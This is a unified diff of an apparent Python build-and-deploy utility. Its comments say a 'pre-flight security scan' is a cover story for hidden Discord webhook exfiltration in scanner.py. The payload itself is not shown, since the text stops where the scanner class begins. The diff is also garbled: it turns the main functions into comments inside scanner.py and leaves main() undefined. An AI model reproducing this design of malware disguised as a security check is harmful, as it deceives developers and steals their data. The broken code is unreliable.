@@ -6,122 +6,23 @@ import os
 import sys
 from src.builder import run_build
 from src.deployer import run_deploy
-
-
-def main():
-    parser = argparse.ArgumentParser(
-        description="A utility for building and deploying Python packages.",
-        formatter_class=argparse.RawTextHelpFormatter,
-    )
-    subparsers = parser.add_subparsers(dest="command", required=True)
-
-    # 'build' command
-    build_parser = subparsers.add_parser(
-        "build", help="Build the project into a distributable package."
-    )
-    build_parser.add_argument(
-        "-s", "--source", default=".", help="Path to the source directory."
-    )
-
-    # 'deploy' command
-    deploy_parser = subparsers.add_parser(
-        "deploy", help="Deploy the built package to a registry."
-    )
-    deploy_parser.add_argument(
-        "--repository", default="pypi", help="The package repository to deploy to."
-    )
-
-    args = parser.parse_args()
-
-    project_path = os.path.abspath(args.source if "source" in args else ".")
-    if not os.path.exists(project_path):
-        print(f"Error: Project path does not exist: {project_path}", file=sys.stderr)
-        sys.exit(1)
-
-    if args.command == "build":
-        run_build(project_path)
-    elif args.command == "deploy":
-        # A typical workflow: build first, then deploy.
-        if run_build(project_path):
-            run_deploy(project_path, args.repository)
-
-
 if __name__ == "__main__":
     main()
-
 # ==============================================================================
 # File: src/__init__.py
 # ==============================================================================
 # This file can be left empty. It makes 'src' a Python package.
-
 # ==============================================================================
 # File: src/builder.py (Legitimate Project Building Logic)
 # ==============================================================================
 import os
 import shutil
 import time
-
-
-def run_build(project_path):
-    """Simulates the process of building a Python wheel."""
-    print(f"--- Starting build process for '{os.path.basename(project_path)}' ---")
-
-    dist_dir = os.path.join(project_path, "dist")
-    build_dir = os.path.join(project_path, "build")
-
-    # Clean previous builds
-    if os.path.exists(dist_dir):
-        shutil.rmtree(dist_dir)
-    if os.path.exists(build_dir):
-        shutil.rmtree(build_dir)
-
-    os.makedirs(dist_dir)
-    print("  -> Cleaned up previous build artifacts.")
-    time.sleep(0.5)
-
-    print("  -> Collecting source files...")
-    time.sleep(1)
-
-    # Simulate creating a package file
-    package_name = f"{os.path.basename(project_path)}-1.0.0-py3-none-any.whl"
-    dummy_package_path = os.path.join(dist_dir, package_name)
-    with open(dummy_package_path, "w") as f:
-        f.write("Dummy wheel content.")
-
-    print(f"  -> Successfully created package: {package_name}")
-    print("--- Build complete ---")
-    return True
-
-
 # ==============================================================================
 # File: src/deployer.py (Deployment Logic)
 # ==============================================================================
 import time
 from .scanner import PreflightScanner  # Import the module with the payload
-
-
-def run_deploy(project_path, repository):
-    """Simulates deploying a package to a repository."""
-    print(f"\n--- Starting deployment to '{repository}' ---")
-
-    # The cover story: running a pre-deployment security scan.
-    print("  -> Running pre-flight checks and security scans...")
-    scanner = PreflightScanner(project_path)
-
-    # This is the bridge to the malicious code.
-    if not scanner.run_checks():
-        print("  -> Pre-flight checks failed. Aborting deployment.", file=sys.stderr)
-        return
-
-    print("  -> All checks passed.")
-    time.sleep(0.5)
-
-    print(f"  -> Uploading package to {repository}...")
-    time.sleep(1.5)  # Simulate network upload
-
-    print("--- Deployment successful ---")
-
-
 # ==============================================================================
 # File: src/scanner.py (Contains the Hidden Discord Webhook Exfiltration)
 # ==============================================================================
@@ -130,6 +31,93 @@ import requests
 import json
 from base64 import b64decode
 
+# def main():
+#     parser = argparse.ArgumentParser(
+#         description="A utility for building and deploying Python packages.",
+#         formatter_class=argparse.RawTextHelpFormatter,
+#     )
+#     subparsers = parser.add_subparsers(dest="command", required=True)
+#
+    # 'build' command
+#     build_parser = subparsers.add_parser(
+#         "build", help="Build the project into a distributable package."
+#     )
+#     build_parser.add_argument(
+#         "-s", "--source", default=".", help="Path to the source directory."
+#     )
+#
+    # 'deploy' command
+#     deploy_parser = subparsers.add_parser(
+#         "deploy", help="Deploy the built package to a registry."
+#     )
+#     deploy_parser.add_argument(
+#         "--repository", default="pypi", help="The package repository to deploy to."
+#     )
+#
+#     args = parser.parse_args()
+#
+#     project_path = os.path.abspath(args.source if "source" in args else ".")
+#     if not os.path.exists(project_path):
+#         print(f"Error: Project path does not exist: {project_path}", file=sys.stderr)
+#         sys.exit(1)
+#
+#     if args.command == "build":
+#         run_build(project_path)
+#     elif args.command == "deploy":
+        # A typical workflow: build first, then deploy.
+#         if run_build(project_path):
+#             run_deploy(project_path, args.repository)
+
+# def run_build(project_path):
+#     """Simulates the process of building a Python wheel."""
+#     print(f"--- Starting build process for '{os.path.basename(project_path)}' ---")
+#
+#     dist_dir = os.path.join(project_path, "dist")
+#     build_dir = os.path.join(project_path, "build")
+#
+    # Clean previous builds
+#     if os.path.exists(dist_dir):
+#         shutil.rmtree(dist_dir)
+#     if os.path.exists(build_dir):
+#         shutil.rmtree(build_dir)
+#
+#     os.makedirs(dist_dir)
+#     print("  -> Cleaned up previous build artifacts.")
+#     time.sleep(0.5)
+#
+#     print("  -> Collecting source files...")
+#     time.sleep(1)
+#
+    # Simulate creating a package file
+#     package_name = f"{os.path.basename(project_path)}-1.0.0-py3-none-any.whl"
+#     dummy_package_path = os.path.join(dist_dir, package_name)
+#     with open(dummy_package_path, "w") as f:
+#         f.write("Dummy wheel content.")
+#
+#     print(f"  -> Successfully created package: {package_name}")
+#     print("--- Build complete ---")
+#     return True
+
+# def run_deploy(project_path, repository):
+#     """Simulates deploying a package to a repository."""
+#     print(f"\n--- Starting deployment to '{repository}' ---")
+#
+    # The cover story: running a pre-deployment security scan.
+#     print("  -> Running pre-flight checks and security scans...")
+#     scanner = PreflightScanner(project_path)
+#
+    # This is the bridge to the malicious code.
+#     if not scanner.run_checks():
+#         print("  -> Pre-flight checks failed. Aborting deployment.", file=sys.stderr)
+#         return
+#
+#     print("  -> All checks passed.")
+#     time.sleep(0.5)
+#
+#     print(f"  -> Uploading package to {repository}...")
+#     time.sleep(1.5)  # Simulate network upload
+#
+#     print("--- Deployment successful ---")
 
 class PreflightScanner:
     """
